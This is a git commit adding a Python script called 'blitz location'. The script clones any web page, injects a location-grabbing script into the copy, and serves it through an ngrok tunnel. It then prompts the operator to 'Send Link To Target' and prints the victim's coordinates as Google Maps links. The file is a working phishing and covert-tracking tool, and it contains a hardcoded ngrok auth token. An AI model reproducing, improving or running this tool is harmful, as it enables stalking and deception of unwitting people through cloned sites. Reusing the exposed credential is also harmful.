bd913435eb22befeb2a76bb932f56a53992f254c
annon_x <56285690+Blitzkrieg00@users.noreply.github.com>
2022-04-12 00:32:13 -0400

    Add files via upload

---
+++ blitz_loac.py
@@ -0,0 +1,94 @@
+from pyfiglet import Figlet
+from pyngrok import ngrok
+from colorama import Fore
+from subprocess import Popen
+import time
+import os
+import json
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
+import lxml
+from termcolor import colored
+
+f = Figlet(font='slant')
+print("\n\n")
+print(colored("\t\t\t ⢠⣴⣿⣦⣄","red"))
+print(colored("\t\t\t⠀⡄⠙⣿⣿⣿⣦⠀","red"))
+print(colored("\t\t\t⢰⣷⣾⣿⣿⣿⡟","red"))
+print(colored("\t\t\t⠈⠋ ⣿⣿⣿⢄","red"))
+print(colored("\t\t\t  ⣼⣿⣿⣿⡓⣄⠀","red"))
+print(colored("\t\t\t ⡈⣿⣿⣿⣿⡿⠂⠈⠀","red"))
+print(colored("\t\t\t⠀ ⣇⠛⢿⣿⣯⠀","red"))
+print(colored("\t\t\t⠀⠀  ⣿⣿⠀","red"))
+print(colored("\t\t\t  ⣀⣼⣿⠀","red"))
+print(colored("\t\t\t⣾⣿⣿⣿⣿⣿⣷⣤⠀⠀","green"))
+print(colored("\t\t\t⠋⠋⠋⠋⠋⠋⠋⠋⠋⠀","green"))
+print(colored(f.renderText("blitz location"),"green"))
+print(colored("                                               developed by mmk","red"))
+print(colored("                                               version 1.0","red"))
+print("\n\n")
+
+def deafult_server():
+	with open("logs/location_log.log","w") as deafult:
+		Popen(('php','-S','localhost:8786'),stdout=deafult,stderr=deafult)
+def clone_webpage():
+	url_to_clone = input("Enter url to clone: ")
+	clone_html = requests.get(url_to_clone)
+	clone_html = clone_html.text
+	soup = BeautifulSoup(clone_html, 'lxml')
+	parsed_uri = urlparse(url_to_clone)
+	domain = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
+	for s in soup.find_all('script'):
+		url = s.get('src')
+		if url is not None:
+                	if not url.startswith('http'):
+                		clone_html = clone_html.replace(url, domain + url)
+        
+	for css in soup.find_all('link'):
+        	url = css.get('href')
+        	if url is not None:
+        		if not url.startswith('http'):
+                    		clone_html = clone_html.replace(url, domain + url)
+
+	for img in soup.find_all('img'):
+		url = img.get('src')
+		if url is not None:
+                	if not url.startswith('http'):
+                    		clone_html = clone_html.replace(url, domain + url)
+	return clone_html
+def write_webpage(content):
+	f = open('index.html','w')
+	f.write('<script src="get_loca.js"></script>')
+	f.write(content)	
+	f.close()
+			
+def recv_loc():
+	time.sleep(4)
+	stat_file_ip = str(os.stat('result.json').st_size)
+	file_ip  = open('result.json',"r")
+	i = file_ip.read()
+	try:
+        	infor = json.loads(i)
+        	for value in infor['info']:
+        		print(Fore.WHITE+"\n Google Map Link : "+Fore.GREEN+f"https://www.google.com/maps/place/{value['lat']}+{value['lon']}")
+        		print(Fore.GREEN+"\n [!] "+Fore.WHITE+"got location  (: ")
+        		file_recv = open("result.json","w")
+        		file_recv.write("")
+        		file_recv.close()
+        
+	except:
+		haha = 0
+		
+def main():
+	content = clone_webpage()
+	write_webpage(content)
+	deafult_server()
+	a = ngrok.connect(8786,"http",auth_token="25sYm3hlB2o5yuFK56Cz4TQgw9k_3Ze6sU9FUpDSurUNcUX78")
+	print(Fore.GREEN+"\n [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
+	print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
+	while True:
+		recv_loc()
+		
+if __name__ == '__main__':
+	main()
